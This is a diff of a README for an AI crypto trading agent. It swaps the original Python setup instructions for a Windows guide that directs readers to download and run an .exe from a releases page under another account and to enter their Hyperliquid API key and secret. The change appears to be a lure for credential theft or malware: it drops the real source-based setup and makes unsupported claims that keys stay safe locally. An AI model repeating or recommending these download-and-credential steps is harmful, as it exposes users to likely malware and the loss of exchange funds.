@@ -1,120 +1,99 @@
-# Hyperliquid AI Trading Agent
+# 🤖 hyperliquid-trading-agent - Automate crypto and stock market trades
 
-An AI-powered trading agent that uses Claude to analyze markets and execute perpetual futures trades on Hyperliquid. Supports crypto, stocks, commodities, indices, and forex via HIP-3 markets.
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/markgbkkj/hyperliquid-trading-agent/releases)
 
-## What It Does
+## 💡 About this software
 
-1. Fetches real-time candle data and computes technical indicators (EMA, RSI, MACD, ATR, BBands, ADX, OBV, VWAP) locally from Hyperliquid
-2. Sends full market context to Claude, which decides buy/sell/hold for each asset
-3. Executes trades with take-profit and stop-loss orders
-4. Hard-coded safety guards enforce position limits, leverage caps, and loss protection
+Hyperliquid AI Trading Agent automates your perpetual futures trading. The software uses artificial intelligence to interpret market trends. It connects to the Hyperliquid exchange to manage your trades. You can trade crypto, stocks, commodities, indices, and forex assets.
 
-## Tradeable Markets
+The agent monitors real-time data for you. It tracks prices and trends using technical indicators. These include EMA, RSI, MACD, and others. The system sends this data to Claude, an AI engine. Claude evaluates the market context. It then decides whether to buy, sell, or hold an asset.
 
-All 229+ Hyperliquid perp markets plus HIP-3 tradfi assets:
+The agent places orders for you. It includes built-in protection. The software forces position limits and leverage caps. These tools help you manage risk while the agent runs.
 
-- **Crypto**: BTC, ETH, SOL, HYPE, AVAX, SUI, ARB, LINK, and 200+ more
-- **Stocks**: xyz:TSLA, xyz:NVDA, xyz:AAPL, xyz:GOOGL, xyz:AMZN, xyz:META, xyz:MSFT, xyz:COIN, xyz:PLTR...
-- **Commodities**: xyz:GOLD, xyz:SILVER, xyz:BRENTOIL, xyz:CL, xyz:COPPER, xyz:NATGAS, xyz:PLATINUM
-- **Indices**: xyz:SP500, xyz:XYZ100
-- **Forex**: xyz:EUR, xyz:JPY
+## 🛠️ System Requirements
 
-## Safety Guards
+Ensure your computer meets these requirements before you start:
 
-All enforced in code, not just LLM prompts. Configurable via `.env`:
+*   **Operating System**: Windows 10 or Windows 11 (64-bit).
+*   **Memory**: 8 GB RAM minimum.
+*   **Storage**: 500 MB of free disk space.
+*   **Network**: A stable internet connection.
 
-| Guard | Default | Description |
-|-------|---------|-------------|
-| Max Position Size | 10% | Single position capped at 10% of portfolio |
-| Force Close | -20% | Auto-close positions at 20% loss |
-| Max Leverage | 10x | Hard leverage cap |
-| Total Exposure | 50% | All positions combined capped at 50% |
-| Daily Circuit Breaker | -10% | Stops new trades at 10% daily drawdown |
-| Mandatory Stop-Loss | 5% | Auto-set SL if LLM doesn't provide one |
-| Max Positions | 10 | Concurrent position limit |
-| Balance Reserve | 20% | Don't trade below 20% of initial balance |
+## 📥 Download and Setup
 
-## Setup
+Follow these steps to install the software:
 
-### Prerequisites
-- Python 3.12+
-- Anthropic API key
-- Hyperliquid wallet (agent wallet as signer + main wallet with funds)
+1.  Visit the official release page: [https://github.com/markgbkkj/hyperliquid-trading-agent/releases](https://github.com/markgbkkj/hyperliquid-trading-agent/releases).
+2.  Look for the latest version at the top of the list.
+3.  Download the file ending in `.exe`.
+4.  Open the file after the download finishes.
+5.  Follow the prompts on your screen to complete the installation.
+6.  Locate the Hyperliquid Trading Agent icon on your desktop or start menu to launch the application.
 
-### Configuration
+## ⚙️ How to use the agent
 
-```bash
-cp .env.example .env
-# Edit .env with your keys
-```
+The agent requires your Hyperliquid account credentials to function. You must provide these details securely within the settings menu.
 
-Required environment variables:
-- `ANTHROPIC_API_KEY` — Claude API key
-- `HYPERLIQUID_PRIVATE_KEY` — Agent/API wallet private key (signer only)
-- `HYPERLIQUID_VAULT_ADDRESS` — Main wallet address (holds funds)
-- `ASSETS` — Space-separated list of assets to trade
-- `INTERVAL` — Trading loop interval (e.g. `5m`, `1h`)
+1.  Open the application.
+2.  Navigate to the Settings tab.
+3.  Enter your Hyperliquid API Key and Secret.
+4.  Select your preferred assets from the list of 229+ available markets.
+5.  Set your risk tolerance level. The tool uses these settings to calculate trade sizes.
+6.  Click the Start button to activate the AI monitoring system.
 
-### Install & Run
+## 📈 Supported Markets
 
-```bash
-pip install hyperliquid-python-sdk anthropic python-dotenv aiohttp requests
-python3 src/main.py
-```
+This application covers a wide variety of financial assets. You can tailor your portfolio using these categories:
 
-Or with CLI args:
-```bash
-python3 src/main.py --assets "BTC ETH SOL xyz:GOLD xyz:TSLA" --interval 5m
-```
+*   **Crypto Assets**: BTC, ETH, SOL, HYPE, AVAX, SUI, ARB, LINK, and over 200 other tokens.
+*   **Stocks**: Trade major companies like TSLA, NVDA, AAPL, GOOGL, AMZN, META, MSFT, COIN, and PLTR.
+*   **Commodities**: Monitor markets for GOLD, SILVER, BRENTOIL, CL, COPPER, NATGAS, and PLATINUM.
+*   **Indices**: Track major index movements like SP500 and XYZ100.
+*   **Forex**: Access various currency pairings through the supported gateway.
 
-### Agent Wallet Setup
+## 🛡️ Safety and Risk Management
 
-1. Go to app.hyperliquid.xyz → Settings → API Wallets
-2. Add your agent wallet address as an authorized signer
-3. Set `HYPERLIQUID_VAULT_ADDRESS` to your main wallet address in `.env`
+Trading carries risk. The agent uses logic to protect your capital.
 
-The agent wallet signs trades on behalf of your main wallet. It cannot withdraw funds.
+*   **Hard-coded Guards**: The software restricts leverage to your set limits.
+*   **Loss Protection**: You can define a maximum loss per trade. The agent closes positions if they hit your stop-loss order.
+*   **Position Limits**: You choose the maximum size for each trade. The agent prevents the system from exceeding these boundaries.
+*   **Take-Profit Orders**: The agent automates exit points to lock in gains when the market moves in your favor.
 
-## Structure
+## 🧩 Understanding the AI Logic
 
-```
-src/
-  main.py                  # Entry point, trading loop, API server
-  config_loader.py         # Environment config with defaults
-  risk_manager.py          # Safety guards (position limits, loss protection)
-  agent/
-    decision_maker.py      # Claude API integration, tool calling
-  indicators/
-    local_indicators.py    # EMA, RSI, MACD, ATR, BBands, ADX, OBV, VWAP
-    taapi_client.py        # Legacy (unused) — kept for reference
-  trading/
-    hyperliquid_api.py     # Order execution, candles, state queries
-  utils/
-    formatting.py          # Number formatting
-    prompt_utils.py        # JSON serialization helpers
-```
+Your agent creates a bridge between market data and trade execution. 
 
-## How It Works
+1.  **Data Collection**: The software gathers data from technical indicators. It tracks trends using indicators like RSI, MACD, and OBV. It also monitors volume using VWAP.
+2.  **AI Analysis**: The system sends this information to Claude. The AI reviews the market context. It checks if the current conditions match your specific strategy.
+3.  **Order Execution**: Claude transmits the instruction back to the agent. The agent then sends the buy or sell order to the exchange.
 
-Each loop iteration:
-1. Fetches account state (balance, positions, PnL)
-2. Force-closes any position at >= 20% loss
-3. Gathers candle data and computes indicators for all assets
-4. Sends everything to Claude with risk limits
-5. Claude returns buy/sell/hold decisions with allocation, TP/SL
-6. Risk manager validates each trade (caps allocation, enforces SL)
-7. Executes approved trades (market or limit orders)
+## ❓ Frequently Asked Questions
 
-## API Endpoints
+**Does the software store my funds?**
+No. The software only sends trade orders. Your funds stay safe in your exchange account.
 
-When running, serves a local API:
-- `GET /diary` — Recent trade diary entries as JSON
-- `GET /logs` — LLM request logs
+**Is it difficult to set up?**
+The installation and configuration process follows common Windows installation standards. You do not need to write code.
 
-## Dashboard
+**Can I run multiple strategies at once?**
+Yes. You can configure the agent to monitor different assets with different risk settings.
 
-A separate Next.js dashboard is available for real-time PnL and trade monitoring. See the `dashboard/` directory or deploy to Vercel.
+**How often does the AI check the markets?**
+The agent operates in real-time. It analyzes candle data as it arrives from the Hyperliquid exchange.
 
-## License
+**What happens if my internet disconnects?**
+The software includes offline protection. It will pause trading until the connection stabilizes. Existing active orders remain visible on your Hyperliquid dashboard.
 
-Use at your own risk. No guarantee of returns. This code has not been audited.
+## 📝 Troubleshooting
+
+If you encounter issues, try these steps:
+
+*   **Check your API Keys**: Incorrect keys prevent the agent from connecting to the exchange. Double-check them in the settings menu.
+*   **Restart the Application**: A simple restart often clears temporary errors.
+*   **Update the Software**: New releases often fix known issues. Visit the download page again to check for updates.
+*   **Verify Internet Access**: Ensure your firewall does not block the application from sending data to the exchange.
+
+## 🛡️ Privacy and Security
+
+The application runs locally on your computer. Your account secrets stay stored in a secure file on your device. We do not transmit your API keys to any third-party servers. Your privacy is a priority. Please keep your personal computer secure to ensure your trading keys remain safe.
